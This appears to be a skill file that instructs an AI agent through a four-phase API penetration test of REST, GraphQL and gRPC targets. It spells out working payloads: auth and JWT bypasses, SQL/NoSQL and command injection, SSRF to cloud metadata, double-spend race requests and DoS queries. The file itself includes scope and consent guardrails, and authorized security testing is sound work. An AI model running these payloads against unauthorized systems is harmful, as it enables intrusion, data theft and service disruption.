---
name: atest
version: 1.0.0
description: "Lightweight API penetration testing framework for REST, GraphQL, and gRPC targets. 4 focused phases without full infrastructure recon overhead."
tags: [api, rest, graphql, grpc, pentest, authentication, injection]
trigger: "api pentest, api security test, graphql pentest, grpc pentest, rest api test, api-only engagement"
argument-hint: "<command: start|status|resume|next|report>"
metadata:
  hermes:
    tags: [api, rest, graphql, grpc, pentest]
    related_skills: [ptest, scode]
---

# API-First Penetration Testing Framework

Focused 4-phase workflow for pure API engagements (REST, GraphQL, gRPC) where no web UI or mobile app is in scope. Skips infrastructure recon and goes straight to API-level testing.

## Architecture

```
Phase 1: Scope & Recon → Phase 2: AuthN/AuthZ → Phase 3: Injection & Logic → Phase 4: Reporting
```

## Commands

| Command | Action |
|---------|--------|
| `start` | Initialize engagement — define API targets, auth mechanism, documentation |
| `status` | Show current phase, progress, findings count |
| `resume` | Resume interrupted engagement from last checkpoint |
| `next` | Advance to next phase (runs exit criteria check) |
| `report` | Generate final report |
| `cleanup` | Archive engagement output, remove temporary files |

If no command is given, show current status and suggest next action.

---

## Initialization (`start`)

Collect before testing:

1. **API Type** — REST, GraphQL, gRPC, mixed
2. **Base URLs** — all API endpoints in scope
3. **Documentation** — OpenAPI/Swagger URL, GraphQL introspection, `.proto` files
4. **Authentication** — mechanism (JWT, OAuth, API key, session, mTLS), credentials provided?
5. **Authorization Model** — RBAC, ABAC, tenant isolation, role hierarchy
6. **Rate Limits** — known limits, testing restrictions
7. **Rules of Engagement** — write operations allowed? data creation limits?

Create output directory:

```
./atest-output/
├── state.yaml
├── scope.md
├── findings-log.md
├── phase1-recon/
│   ├── endpoints.md
│   └── auth-flow.md
├── phase2-authz/
├── phase3-injection/
└── report/
```

Write `state.yaml`:

```yaml
engagement:
  name: ""
  started: ""
  api_type: ""  # rest, graphql, grpc, mixed
  auth_mechanism: ""  # jwt, oauth, apikey, session, mtls, none

gateways:
  1_recon: OPEN
  2_authn_authz: LOCKED
  3_injection_logic: LOCKED
  4_reporting: LOCKED

findings_count: 0
current_phase: 1

config:
  base_urls: []
  has_graphql: false
  has_grpc: false
  write_ops_allowed: true
  rate_limit_known: ""
```

---

## Phase 1: Scope & Recon

### Gate: endpoints mapped, auth flow documented, API surface understood

**Techniques:**

1. **Documentation Discovery:**
   ```bash
   # OpenAPI/Swagger
   for path in /swagger.json /openapi.json /api-docs /swagger-ui.html /v2/api-docs /v3/api-docs; do
     curl -sk -o /dev/null -w "%{http_code} $path\n" "$BASE_URL$path"
   done

   # GraphQL introspection
   curl -s "$BASE_URL/graphql" -H "Content-Type: application/json" \
     -d '{"query":"{ __schema { queryType { fields { name } } mutationType { fields { name args { name type { name kind ofType { name } } } } } } }"}'

   # gRPC reflection
   grpcurl -plaintext $HOST:$PORT list
   grpcurl -plaintext $HOST:$PORT describe <service>
   ```

2. **Endpoint Enumeration:**
   - Parse OpenAPI spec for all paths + methods
   - Extract from JS bundles if frontend exists
   - Fuzz common API paths: `/api/v1/users`, `/api/v1/admin`, `/internal/`
   - Check for versioning: `/v1/`, `/v2/`, `/v3/` (older versions may lack auth)

3. **Authentication Flow:**
   - Document token lifecycle (obtain → refresh → expire)
   - Identify token type and claims (JWT decode)
   - Map which endpoints require auth vs public
   - Check for API key in headers vs query params

4. **Response Analysis:**
   - Identify data models from responses
   - Note sequential/predictable IDs (IDOR candidates)
   - Check error verbosity (stack traces, internal paths)
   - Document rate limit headers (`X-RateLimit-*`, `Retry-After`)

**Reference:** `references/rest-api-patterns.md`, `references/graphql-testing.md`, `references/grpc-testing.md`

---

## Phase 2: Authentication & Authorization

### Gate: auth bypass tested, BOLA/IDOR tested on all object-referencing endpoints, privilege escalation attempted

**Techniques:**

1. **Authentication Bypass:**
   ```bash
   # Remove auth header entirely
   curl -sk "$ENDPOINT"
   # Empty Bearer token
   curl -sk -H "Authorization: Bearer " "$ENDPOINT"
   # JWT none algorithm
   # JWT expired token reuse
   # JWT signature stripping
   ```

2. **JWT Attacks (if JWT):**
   - Algorithm confusion (RS256 → HS256 with public key as secret)
   - `alg: none` bypass
   - Key ID (`kid`) injection (path traversal, SQLi)
   - `jku`/`jwk` header injection
   - Weak secret brute-force: `hashcat -m 16500 jwt.txt wordlist.txt`
   - Expired token acceptance
   - Cross-tenant token reuse

3. **BOLA/IDOR:**
   ```bash
   # For every endpoint with an object reference:
   # Test horizontal access (user A's token → user B's resource)
   curl -sk -H "Authorization: Bearer $TOKEN_A" "$BASE_URL/api/users/$USER_B_ID"
   # Test with different ID formats: numeric, UUID, encoded
   # Test collection endpoints: /api/users (returns all?)
   ```

4. **Privilege Escalation:**
   - Vertical: regular user → admin endpoints
   - Role parameter injection: `{"role": "admin"}` in registration/update
   - Function-level: access admin functions with user token
   - Tenant isolation: cross-tenant data access

5. **OAuth Flows (if OAuth):**
   - `redirect_uri` manipulation
   - Authorization code reuse
   - PKCE bypass (downgrade to no PKCE)
   - Token exchange abuse
   - Client credential theft

6. **Rate Limiting:**
   ```bash
   # Test rate limit enforcement
   for i in $(seq 1 100); do
     curl -sk -o /dev/null -w "%{http_code}\n" -H "Authorization: Bearer $TOKEN" "$ENDPOINT"
   done | sort | uniq -c
   # Bypass attempts: IP rotation headers, different auth tokens, path case variation
   ```

**Reference:** `references/api-auth-bypass.md`

**Cross-reference:** ptest `references/jwt-attack-techniques.md`, `references/oauth-sso-attack-chains.md`

**Cross-skill triggers from atest:**
- SSRF found → invoke `ctest` Phase 3 (cloud metadata, internal services)
- Cloud storage URLs in responses → invoke `ctest` Phase 3 (S3/GCS/Blob misconfig)
- API serves mobile app → invoke `mtest` if app not yet tested
- Smart contract interaction via API → invoke `w3hunt`
- Source code leaked via error/debug → invoke `scode`
- Geo-blocked endpoints → see ptest `references/geo-restriction-bypass.md`

**OpenAPI/Swagger discovery (MANDATORY in Phase 1):**
- Check standard paths: `/docs`, `/swagger`, `/openapi.json`, `/api-docs`, `/swagger.json`
- **JS bundle extraction:** Modern SPAs often embed the full OpenAPI spec in JS bundles. Search for `openapi` in JS filenames: `curl -s https://target/ | grep -oE '/static/js/openapi[^"]+\.js'` — then extract all `url:"..."` patterns. This revealed 494 endpoints on Wallet on Telegram in seconds.
- Telegram Mini Apps: see ptest `references/telegram-webapp-auth.md` for auth patterns

---

## Phase 3: Injection & Logic

### Gate: injection tested on all input parameters, business logic flaws assessed, race conditions tested where applicable

**Techniques:**

1. **Mass Assignment:**
   ```bash
   # Add unexpected fields to creation/update requests
   curl -sk -X POST "$BASE_URL/api/users" -H "Content-Type: application/json" \
     -d '{"name":"test","email":"test@test.com","role":"admin","is_verified":true,"balance":99999}'
   # Check which fields were accepted
   ```

2. **Injection:**
   ```bash
   # SQL injection
   curl -sk "$BASE_URL/api/users?id=1' OR '1'='1"
   curl -sk "$BASE_URL/api/users?sort=name;DROP TABLE users--"

   # NoSQL injection (MongoDB)
   curl -sk -X POST "$BASE_URL/api/login" -H "Content-Type: application/json" \
     -d '{"username":{"$gt":""},"password":{"$gt":""}}'

   # Command injection (in processing endpoints)
   curl -sk -X POST "$BASE_URL/api/convert" -d '{"filename":"test;id;.pdf"}'

   # SSRF (in URL parameters)
   curl -sk "$BASE_URL/api/fetch?url=http://169.254.169.254/latest/meta-data/"
   ```

3. **GraphQL-Specific:**
   ```bash
   # Alias-based batching (amplification)
   curl -s "$BASE_URL/graphql" -H "Content-Type: application/json" \
     -d '{"query":"mutation { a:createUser(input:{name:\"t1\"}) { id } b:createUser(input:{name:\"t2\"}) { id } }"}'

   # Nested query DoS (depth attack)
   curl -s "$BASE_URL/graphql" -H "Content-Type: application/json" \
     -d '{"query":"{ users { posts { comments { author { posts { comments { author { name } } } } } } } }"}'

   # Field suggestion exploitation
   curl -s "$BASE_URL/graphql" -H "Content-Type: application/json" \
     -d '{"query":"{ __type(name:\"User\") { fields { name type { name } } } }"}'
   ```

4. **Business Logic:**
   - Negative values in financial operations
   - Step skipping in multi-step workflows
   - Parallel requests for race conditions (double-spend)
   - Coupon/promo code reuse
   - Quantity manipulation (0, -1, MAX_INT)
   - State machine violations (cancel after ship, refund after refund)

5. **Race Conditions:**
   ```bash
   # Parallel requests for double-spend
   seq 1 10 | xargs -P10 -I{} curl -sk -X POST "$BASE_URL/api/transfer" \
     -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
     -d '{"to":"attacker","amount":1000}'
   ```

6. **Data Exposure:**
   - Excessive data in responses (PII, internal IDs, debug info)
   - Different response sizes for valid vs invalid resources (enumeration)
   - Error messages leaking implementation details
   - Pagination bypass (requesting page_size=99999)

7. **gRPC-Specific:**
   ```bash
   # Message manipulation
   grpcurl -plaintext -d '{"user_id": "OTHER_USER"}' $HOST:$PORT service/GetProfile
   # Reflection-based enumeration
   grpcurl -plaintext $HOST:$PORT list
   # Large message DoS
   grpcurl -plaintext -d '{"data": "'$(python3 -c "print('A'*1000000)")'" }' $HOST:$PORT service/Process
   ```

**Reference:** `references/graphql-testing.md`, `references/grpc-testing.md`

---

## Phase 4: Reporting

### Gate: report delivered with all findings documented and PoCs included

**Report Structure:**

```markdown
# API Penetration Test Report — {Target}

## 1. Executive Summary
- API type, endpoints tested, auth mechanism
- Severity breakdown
- Top risk and business impact

## 2. Scope & Methodology
- Base URLs, API version, documentation source
- 4-phase methodology with status
- Tools used, testing constraints

## 3. API Surface Map
- Endpoint inventory (method, path, auth required, parameters)
- Data models identified
- Auth flow diagram

## 4. Findings Summary
| ID | Title | Severity | Category | Endpoint |

## 5. Detailed Findings
- Each finding with: description, endpoint, request/response, impact, remediation

## 6. Remediation Roadmap
- Immediate: auth bypass, injection fixes
- Short-term: BOLA fixes, rate limiting
- Medium-term: architecture improvements

## Appendix: PoC Scripts
- curl commands for each finding
- Race condition scripts
- Token manipulation examples
```

---

## Finding Template

```markdown
## [ATEST-{ID}] {Title}

**Severity:** Critical / High / Medium / Low / Info
**Category:** AuthN / AuthZ / Injection / Logic / Data Exposure / DoS
**Endpoint:** `{METHOD} {path}`
**Parameter:** {affected parameter}

### Description
{What the vulnerability is}

### Request
```http
{Full HTTP request}
`` `

### Response
```http
{Relevant response showing the issue}
`` `

### Impact
{What an attacker can achieve}

### Remediation
{Specific fix}
```

---

## Mandatory Checks

| Category | Minimum Tests |
|----------|--------------|
| Auth Bypass | Remove token, empty token, expired token, wrong tenant token |
| BOLA | Every endpoint with object reference tested cross-user |
| Mass Assignment | Every POST/PUT/PATCH tested with extra fields |
| Injection | Top 3 input parameters per endpoint tested for SQLi/NoSQLi |
| Rate Limiting | Auth endpoints + sensitive operations tested |
| Data Exposure | All list endpoints checked for over-fetching |

---

## Effort Allocation

| Phase | % of Total Time | Rationale |
|-------|----------------|-----------|
| 1 Recon | 15% | API surface mapping |
| 2 AuthN/AuthZ | 40% | Highest-value — BOLA is #1 API risk |
| 3 Injection & Logic | 30% | Broad testing surface |
| 4 Reporting | 15% | Write-up + PoCs |

---

## Guardrails

- **Write Operations** — confirm with operator before creating/modifying data. Use obviously-fake test data (`PENTEST-PROBE-*`).
- **Rate Limits** — if you trigger a rate limit, back off. Document the limit as a finding if it's too permissive, not as a blocker.
- **Production Data** — never exfiltrate real user data beyond what's needed to prove the finding. Redact PII in report screenshots.
- **Scope Enforcement** — only test documented endpoints. If you discover undocumented internal APIs, confirm they're in scope before testing.
- **No Destructive Operations** — don't DELETE production resources unless explicitly authorized. Prove DELETE works via 400/405 response analysis (see ptest Write Access Response Protocol).
- **GraphQL Depth** — don't crash the server with unbounded nested queries. Test with depth 5-7, document if no depth limit exists.
